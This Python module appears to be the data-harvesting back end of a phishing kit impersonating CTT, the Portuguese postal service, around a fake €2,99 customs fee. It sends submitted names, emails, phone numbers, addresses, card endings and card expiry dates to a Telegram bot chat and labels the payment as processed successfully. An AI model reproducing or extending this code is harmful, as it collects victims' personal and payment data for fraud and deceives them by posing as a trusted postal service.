import os
import httpx
import asyncio
from datetime import datetime
from typing import Dict, Any
import logging
from console_service import console_service

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        self.bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        
        if not self.bot_token or not self.chat_id:
            logger.warning("Telegram bot token or chat ID not configured")
    
    def escape_markdown_v2(self, text: str) -> str:
        """Escape special characters for MarkdownV2"""
        special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        for char in special_chars:
            text = text.replace(char, f'\\{char}')
        return text
    
    async def send_message(self, message: str, parse_mode: str = "MarkdownV2") -> bool:
        """Send message to Telegram"""
        if not self.bot_token or not self.chat_id:
            logger.error("Telegram configuration missing")
            return False
            
        try:
            async with httpx.AsyncClient() as client:
                if parse_mode == "MarkdownV2":
                    message = self.escape_markdown_v2(message)
                
                response = await client.post(
                    f"{self.base_url}/sendMessage",
                    json={
                        "chat_id": self.chat_id,
                        "text": message,
                        "parse_mode": parse_mode
                    },
                    timeout=10.0
                )
                
                if response.status_code == 200:
                    logger.info("Message sent to Telegram successfully")
                    return True
                else:
                    logger.error(f"Failed to send Telegram message: {response.text}")
                    return False
                    
        except Exception as e:
            logger.error(f"Error sending Telegram message: {str(e)}")
            return False
    
    async def send_billing_info(self, billing_data: Dict[str, Any]) -> bool:
        """Send billing information to Telegram"""
        try:
            message = f"""
🏠 *Nova Informação de Entrega CTT*

👤 *Dados Pessoais:*
• Nome: {billing_data.get('nome', 'N/A')}
• Email: {billing_data.get('email', 'N/A')}
• Telefone: {billing_data.get('telefone', 'N/A')}

📍 *Endereço:*
• Morada: {billing_data.get('endereco', 'N/A')}
• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
• Cidade: {billing_data.get('cidade', 'N/A')}

⏰ *Data de Submissão:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}

🔄 *Estado:* Aguarda pagamento da taxa alfandegária
            """
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting billing message: {str(e)}")
            return False
    
    async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
        """Send payment information to Telegram"""
        try:
            # Mask card number for security
            card_number = card_data.get('numeroCartao', '')
            masked_card = '**** **** **** ' + card_number[-4:] if len(card_number) >= 4 else '****'
            
            message = f"""
💳 *Pagamento de Taxa Alfandegária CTT*

👤 *Cliente:*
• Nome: {billing_data.get('nome', 'N/A')}
• Email: {billing_data.get('email', 'N/A')}

💰 *Detalhes do Pagamento:*
• Valor: €2,99
• Cartão: {masked_card}
• Data Exp.: {card_data.get('dataExpiracao', 'N/A')}

📍 *Entrega:*
• Endereço: {billing_data.get('endereco', 'N/A')}
• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
• Cidade: {billing_data.get('cidade', 'N/A')}
• Telefone: {billing_data.get('telefone', 'N/A')}

⏰ *Data de Pagamento:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}

✅ *Estado:* Pagamento processado com sucesso
            """
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting payment message: {str(e)}")
            return False
    
    async def send_tracking_update(self, tracking_number: str, status: str) -> bool:
        """Send tracking update to Telegram"""
        try:
            status_emoji = {
                'processing': '🔄',
                'shipped': '📦',
                'in_transit': '🚚',
                'delivered': '✅',
                'failed': '❌'
            }
            
            message = f"""
📦 *Atualização de Rastreamento CTT*

🔢 *Número:* {tracking_number}
{status_emoji.get(status, '📦')} *Estado:* {status}
⏰ *Atualização:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}

🔍 *Rastrear:* [Clique aqui](https://exemplo.com/tracking/{tracking_number})
            """
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting tracking message: {str(e)}")
            return False

# Global instance
telegram_service = TelegramService()